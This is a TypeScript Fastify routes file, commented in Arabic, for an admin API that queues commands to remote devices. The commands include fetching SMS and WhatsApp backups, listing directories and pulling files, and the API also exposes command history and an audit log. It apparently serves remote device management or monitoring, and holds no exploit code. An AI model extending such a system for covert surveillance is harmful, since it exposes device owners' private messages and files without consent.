// src/api/commands.routes.ts
import { FastifyInstance } from 'fastify';
import { z } from 'zod';
import { CommandService } from '../services/CommandService';
import { requireAdmin } from '../middleware/auth.middleware';
import type { CommandType } from '../types/messages';

const VALID_COMMAND_TYPES: CommandType[] = [
  'get_device_info',
  'backup_sms',
  'backup_whatsapp',
  'send_agent_logs',
  'update_config',
  'list_directory',
  'pull_file',
];

const CreateCommandSchema = z.object({
  commandType: z.enum([
    'get_device_info',
    'backup_sms',
    'backup_whatsapp',
    'send_agent_logs',
    'update_config',
    'list_directory',
    'pull_file',
  ]),
  params: z.record(z.unknown()).optional().default({}),
  priority: z.enum(['low', 'normal', 'high']).optional().default('normal'),
  timeoutSeconds: z.number().int().min(10).max(600).optional().default(120),
});

export async function commandsRoutes(app: FastifyInstance): Promise<void> {
  // -----------------------------------------------------------
  // POST /api/v1/devices/:deviceUid/commands
  // إرسال أمر لجهاز معين
  // -----------------------------------------------------------
  app.post<{ Params: { deviceUid: string } }>(
    '/devices/:deviceUid/commands',
    { preHandler: requireAdmin },
    async (request, reply) => {
      const { deviceUid } = request.params;

      const parseResult = CreateCommandSchema.safeParse(request.body);
      if (!parseResult.success) {
        return reply.status(400).send({ error: 'VALIDATION_ERROR', details: parseResult.error.errors });
      }

      const { commandType, params, priority, timeoutSeconds } = parseResult.data;

      try {
        const result = await CommandService.createAndDispatch({
          deviceUid,
          commandType,
          params,
          priority,
          timeoutSeconds,
          adminId: request.admin?.adminId,
        });

        console.log("result: ",result);
        return reply.status(202).send({
          commandId: result.commandId,
          status: result.status,
          dispatched: result.dispatched,
          message: result.dispatched
            ? 'Command dispatched to device'
            : 'Device is offline. Command queued for delivery.',
        });
      } catch (err) {
        const error = err as Error;
        if (error.message === 'DEVICE_NOT_FOUND') {
          return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        throw err;
      }
    }
  );

  // -----------------------------------------------------------
  // GET /api/v1/devices/:deviceUid/commands
  // سجل الأوامر لجهاز
  // -----------------------------------------------------------
  app.get<{ Params: { deviceUid: string }; Querystring: { limit?: string } }>(
    '/devices/:deviceUid/commands',
    { preHandler: requireAdmin },
    async (request, reply) => {
      const { deviceUid } = request.params;
      const limit = parseInt(request.query.limit || '20', 10);

      const commands = await CommandService.getCommandHistory(deviceUid, limit);
      return reply.send({ commands, total: commands.length });
    }
  );

  // -----------------------------------------------------------
  // GET /api/v1/commands  (audit log – كل الأجهزة)
  // -----------------------------------------------------------
  app.get<{ Querystring: { limit?: string } }>(
    '/audit',
    { preHandler: requireAdmin },
    async (request, reply) => {
      const limit = parseInt(request.query.limit || '50', 10);
      const commands = await CommandService.getRecentCommands(limit);
      return reply.send({ commands });
    }
  );
}
